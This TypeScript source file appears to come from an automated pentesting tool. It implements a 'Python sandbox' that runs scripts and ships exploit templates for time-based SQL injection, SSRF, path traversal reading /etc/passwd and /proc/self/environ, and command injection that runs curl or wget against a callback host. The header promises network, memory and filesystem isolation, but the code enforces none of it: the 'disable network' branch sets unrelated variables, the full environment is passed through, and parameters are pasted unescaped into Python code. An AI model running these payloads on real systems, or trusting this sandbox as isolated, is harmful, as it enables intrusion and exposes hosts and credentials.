/**
 * Python Sandbox Service - Phase 2.4: Enhanced Tool Suite
 *
 * Provides isolated Python runtime for executing custom exploits and scripts:
 * - SQLi exploitation (sqlmap-like functionality)
 * - SSRF testing with custom payloads
 * - Template-based exploit execution
 * - Custom vulnerability PoCs
 *
 * Security features:
 * - Execution timeout
 * - Resource limits (memory, CPU)
 * - Restricted filesystem access
 * - No network access (unless explicitly allowed)
 *
 * Use cases:
 * - Run custom SQLi exploitation scripts
 * - Execute SSRF payloads with custom logic
 * - Test serialization vulnerabilities
 * - Run proof-of-concept exploits
 */

import { spawn, ChildProcess } from 'child_process';
import fs from 'fs/promises';
import path from 'path';
import { v4 as uuidv4 } from 'uuid';
import logger from '../utils/logger';
import { trace, SpanStatusCode, context } from '@opentelemetry/api';

export interface PythonSandboxConfig {
  timeout?: number; // Execution timeout in ms (default: 60000)
  maxMemoryMB?: number; // Max memory in MB (default: 512)
  allowNetwork?: boolean; // Allow network access (default: false)
  allowFileAccess?: boolean; // Allow file system access (default: false)
  workingDir?: string; // Working directory for scripts
}

export interface PythonScriptOptions {
  script: string; // Python code to execute
  args?: string[]; // Command-line arguments
  env?: Record<string, string>; // Environment variables
  stdin?: string; // Input to stdin
}

export interface PythonExecutionResult {
  success: boolean;
  stdout: string;
  stderr: string;
  exitCode: number | null;
  duration: number;
  error?: string;
}

export interface ExploitTemplate {
  name: string;
  description: string;
  category: 'sqli' | 'ssrf' | 'xss' | 'lfi' | 'rce' | 'other';
  script: string;
  requiredParams: string[];
}

/**
 * PythonSandbox - Execute Python scripts in isolated environment
 */
export class PythonSandbox {
  private config: Required<PythonSandboxConfig>;
  private workingDir: string;
  private tracer = trace.getTracer('agenthunt-python-sandbox');
  private templates: Map<string, ExploitTemplate> = new Map();

  constructor(config: PythonSandboxConfig = {}) {
    this.config = {
      timeout: config.timeout || 60000,
      maxMemoryMB: config.maxMemoryMB || 512,
      allowNetwork: config.allowNetwork || false,
      allowFileAccess: config.allowFileAccess || false,
      workingDir: config.workingDir || '/tmp/python-sandbox',
    };

    this.workingDir = this.config.workingDir;
    this.loadDefaultTemplates();
  }

  /**
   * Initialize sandbox (create working directory)
   */
  async initialize(): Promise<void> {
    try {
      await fs.mkdir(this.workingDir, { recursive: true });
      logger.info({ workingDir: this.workingDir }, 'Python sandbox initialized');
    } catch (error) {
      logger.error({ error }, 'Failed to initialize Python sandbox');
      throw error;
    }
  }

  /**
   * Execute Python script
   */
  async execute(options: PythonScriptOptions): Promise<PythonExecutionResult> {
    const span = this.tracer.startSpan('python.execute', {
      attributes: {
        'python.script_length': options.script.length,
        'python.has_args': !!options.args?.length,
        'python.timeout_ms': this.config.timeout,
      },
    });

    return context.with(trace.setSpan(context.active(), span), async () => {
      const startTime = Date.now();
      const scriptId = uuidv4().slice(0, 8);
      const scriptPath = path.join(this.workingDir, `script_${scriptId}.py`);

      try {
        // Write script to file
        await fs.writeFile(scriptPath, options.script, 'utf-8');

        // Execute script
        const result = await this.runPython(scriptPath, options);

        span.setAttributes({
          'python.success': result.success,
          'python.exit_code': result.exitCode || 0,
          'python.duration_ms': result.duration,
          'python.stdout_length': result.stdout.length,
          'python.stderr_length': result.stderr.length,
        });
        span.setStatus({ code: SpanStatusCode.OK });

        return result;
      } catch (error: any) {
        span.recordException(error);
        span.setStatus({ code: SpanStatusCode.ERROR, message: error.message });

        return {
          success: false,
          stdout: '',
          stderr: error.message,
          exitCode: null,
          duration: Date.now() - startTime,
          error: error.message,
        };
      } finally {
        // Cleanup script file
        try {
          await fs.unlink(scriptPath);
        } catch (e) {
          // Ignore cleanup errors
        }
        span.end();
      }
    });
  }

  /**
   * Execute Python script from file
   */
  private async runPython(scriptPath: string, options: PythonScriptOptions): Promise<PythonExecutionResult> {
    return new Promise((resolve) => {
      const startTime = Date.now();
      let stdout = '';
      let stderr = '';
      let timedOut = false;

      // Build Python command with restrictions
      const pythonArgs = [scriptPath, ...(options.args || [])];

      // Environment variables
      const env = {
        ...process.env,
        ...options.env,
        PYTHONUNBUFFERED: '1',
      };

      // Disable network if not allowed
      if (!this.config.allowNetwork) {
        env.PYTHONDONTWRITEBYTECODE = '1';
        env.PYTHONHASHSEED = '0';
      }

      // Spawn Python process
      const pythonProcess: ChildProcess = spawn('python3', pythonArgs, {
        cwd: this.workingDir,
        env,
        timeout: this.config.timeout,
      });

      // Capture stdout
      pythonProcess.stdout?.on('data', (data) => {
        stdout += data.toString();
      });

      // Capture stderr
      pythonProcess.stderr?.on('data', (data) => {
        stderr += data.toString();
      });

      // Send stdin if provided
      if (options.stdin) {
        pythonProcess.stdin?.write(options.stdin);
        pythonProcess.stdin?.end();
      }

      // Handle timeout
      const timeoutHandle = setTimeout(() => {
        timedOut = true;
        pythonProcess.kill('SIGTERM');
        setTimeout(() => {
          if (pythonProcess.exitCode === null) {
            pythonProcess.kill('SIGKILL');
          }
        }, 5000);
      }, this.config.timeout);

      // Handle process exit
      pythonProcess.on('close', (exitCode) => {
        clearTimeout(timeoutHandle);

        const duration = Date.now() - startTime;

        resolve({
          success: !timedOut && exitCode === 0,
          stdout: stdout.trim(),
          stderr: stderr.trim(),
          exitCode,
          duration,
          error: timedOut ? 'Execution timeout' : undefined,
        });
      });

      // Handle process error
      pythonProcess.on('error', (error) => {
        clearTimeout(timeoutHandle);

        resolve({
          success: false,
          stdout: stdout.trim(),
          stderr: error.message,
          exitCode: null,
          duration: Date.now() - startTime,
          error: error.message,
        });
      });
    });
  }

  /**
   * Execute exploit from template
   */
  async executeTemplate(templateName: string, params: Record<string, any>): Promise<PythonExecutionResult> {
    const template = this.templates.get(templateName);

    if (!template) {
      throw new Error(`Template "${templateName}" not found`);
    }

    // Validate required parameters
    const missingParams = template.requiredParams.filter((param) => !(param in params));
    if (missingParams.length > 0) {
      throw new Error(`Missing required parameters: ${missingParams.join(', ')}`);
    }

    // Replace parameters in script
    let script = template.script;
    Object.entries(params).forEach(([key, value]) => {
      const placeholder = `{{${key}}}`;
      script = script.replace(new RegExp(placeholder, 'g'), String(value));
    });

    logger.info({ template: templateName, params }, 'Executing exploit template');

    return this.execute({ script });
  }

  /**
   * Register custom exploit template
   */
  registerTemplate(template: ExploitTemplate): void {
    this.templates.set(template.name, template);
    logger.info({ name: template.name, category: template.category }, 'Exploit template registered');
  }

  /**
   * Get all registered templates
   */
  getTemplates(category?: ExploitTemplate['category']): ExploitTemplate[] {
    let templates = Array.from(this.templates.values());

    if (category) {
      templates = templates.filter((t) => t.category === category);
    }

    return templates;
  }

  /**
   * Load default exploit templates
   */
  private loadDefaultTemplates(): void {
    // SQLi time-based blind exploitation
    this.registerTemplate({
      name: 'sqli-time-based',
      description: 'SQL injection time-based blind exploitation',
      category: 'sqli',
      requiredParams: ['url', 'parameter', 'delay'],
      script: `
import requests
import time

url = "{{url}}"
param = "{{parameter}}"
delay = int({{delay}})

# Test time-based SQLi
payloads = [
    f"' AND SLEEP({delay})--",
    f"' OR SLEEP({delay})--",
    f"1' AND SLEEP({delay})#",
    f"' WAITFOR DELAY '00:00:0{delay}'--",
]

vulnerable = False
for payload in payloads:
    start = time.time()
    try:
        response = requests.get(url, params={param: payload}, timeout=delay + 5)
        elapsed = time.time() - start

        if elapsed >= delay:
            print(f"VULNERABLE: {payload}")
            print(f"Delay: {elapsed:.2f}s")
            vulnerable = True
            break
    except requests.Timeout:
        print(f"TIMEOUT: {payload}")
        vulnerable = True
        break
    except Exception as e:
        print(f"ERROR: {str(e)}")

if not vulnerable:
    print("NOT VULNERABLE")
`,
    });

    // SSRF exploitation
    this.registerTemplate({
      name: 'ssrf-basic',
      description: 'SSRF vulnerability testing',
      category: 'ssrf',
      requiredParams: ['url', 'parameter', 'callback'],
      script: `
import requests
import urllib.parse

url = "{{url}}"
param = "{{parameter}}"
callback = "{{callback}}"

# SSRF payloads
payloads = [
    callback,
    f"http://{callback}",
    f"https://{callback}",
    f"http://127.0.0.1@{callback}",
    urllib.parse.quote(callback),
]

for payload in payloads:
    try:
        response = requests.get(url, params={param: payload}, timeout=10)
        print(f"Payload: {payload}")
        print(f"Status: {response.status_code}")
        print(f"Response length: {len(response.text)}")
        print("---")
    except Exception as e:
        print(f"Payload: {payload}")
        print(f"Error: {str(e)}")
        print("---")
`,
    });

    // LFI exploitation
    this.registerTemplate({
      name: 'lfi-basic',
      description: 'Local File Inclusion testing',
      category: 'lfi',
      requiredParams: ['url', 'parameter'],
      script: `
import requests

url = "{{url}}"
param = "{{parameter}}"

# LFI payloads to test
files = [
    "/etc/passwd",
    "/etc/hosts",
    "/proc/self/environ",
    "/var/log/apache2/access.log",
    "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts",
    "C:\\\\boot.ini",
]

payloads = []
for file in files:
    payloads.extend([
        file,
        f"....//....//....//..../{file}",
        f"..%2f..%2f..%2f..%2f{file}",
        f"....\\\\....\\\\....\\\\....\\\\{file}",
    ])

vulnerable = False
for payload in payloads:
    try:
        response = requests.get(url, params={param: payload}, timeout=10)

        # Check for common file contents
        indicators = ["root:", "localhost", "127.0.0.1", "[boot loader]"]

        for indicator in indicators:
            if indicator in response.text:
                print(f"VULNERABLE: {payload}")
                print(f"Found indicator: {indicator}")
                print(f"Response preview: {response.text[:200]}")
                vulnerable = True
                break

        if vulnerable:
            break
    except Exception as e:
        pass

if not vulnerable:
    print("NOT VULNERABLE")
`,
    });

    // Command injection
    this.registerTemplate({
      name: 'rce-command-injection',
      description: 'Remote Command Execution via injection',
      category: 'rce',
      requiredParams: ['url', 'parameter', 'callback'],
      script: `
import requests
import urllib.parse

url = "{{url}}"
param = "{{parameter}}"
callback = "{{callback}}"

# Command injection payloads
payloads = [
    f"; curl {callback}",
    f"| curl {callback}",
    f"& curl {callback}",
    f"&& curl {callback}",
    f"\`curl {callback}\`",
    f"$(curl {callback})",
    f"; wget {callback}",
    f"| wget {callback}",
]

for payload in payloads:
    try:
        response = requests.get(url, params={param: payload}, timeout=10)
        print(f"Payload: {payload}")
        print(f"Status: {response.status_code}")
        print("---")
    except Exception as e:
        print(f"Payload: {payload}")
        print(f"Error: {str(e)}")
        print("---")

print("Check your callback URL for incoming requests")
`,
    });

    logger.info({ count: this.templates.size }, 'Default exploit templates loaded');
  }

  /**
   * Cleanup sandbox (remove all files)
   */
  async cleanup(): Promise<void> {
    try {
      await fs.rm(this.workingDir, { recursive: true, force: true });
      logger.info({ workingDir: this.workingDir }, 'Python sandbox cleaned up');
    } catch (error) {
      logger.error({ error }, 'Failed to cleanup Python sandbox');
    }
  }
}

/**
 * Create a new Python Sandbox instance
 */
export function createSandbox(config?: PythonSandboxConfig): PythonSandbox {
  return new PythonSandbox(config);
}

export default PythonSandbox;
